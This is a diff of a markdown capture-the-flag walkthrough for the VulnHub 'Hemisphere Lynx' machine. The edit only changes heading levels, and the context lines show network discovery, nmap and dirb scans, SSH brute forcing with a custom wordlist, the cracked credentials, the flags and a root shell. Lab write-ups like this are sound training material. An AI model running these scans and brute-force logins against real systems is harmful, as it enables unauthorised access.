@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/hemisphere-lynx,577/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.101
@@ -80,7 +78,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 16.81 seconds
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ dirb http://192.168.1.101
@@ -157,7 +155,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 We couldn't find nothing interesting...\
 In VulnHub page, the author left a hint: **Enumeration | Brute Forze**
 
-### Enumeration
+## Enumeration
 
 I generated a custom wordlist with the content of index page.
 ```
@@ -217,7 +215,7 @@ longitud
 caracteres
 ```
 
-### SSH Brute Forcing
+## SSH Brute Forcing
 
 With this wordlist I attempt to brute force SSH login
 ```
@@ -241,7 +239,7 @@ Credentials:
 * User: **johannes**
 * Pass: **constelaciones**
 
-### SSH Access
+## SSH Access
 
 ```
 $ ssh johannes@192.168.1.101
@@ -282,14 +280,14 @@ johannes@Lynx:~$ id
 uid=1000(johannes) gid=1000(johannes) grupos=1000(johannes),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
 ```
 
-### Flag #1 - User
+## Flag #1 - User
 
 ```
 johannes@Lynx:~$ cat user.txt
 uZ8iARX2aiDV1bNz7Dx4
 ```
 
-### Privilege Escalation
+## Privilege Escalation
 
 In `Desktop` directory we can find a interesting file.
 ```
@@ -318,7 +316,7 @@ root@Lynx:/home/johannes# id
 uid=0(root) gid=0(root) grupos=0(root)
 ```
 
-### Flag #2 - Root
+## Flag #2 - Root
 
 ```
 root@Lynx:~# cat root.txt
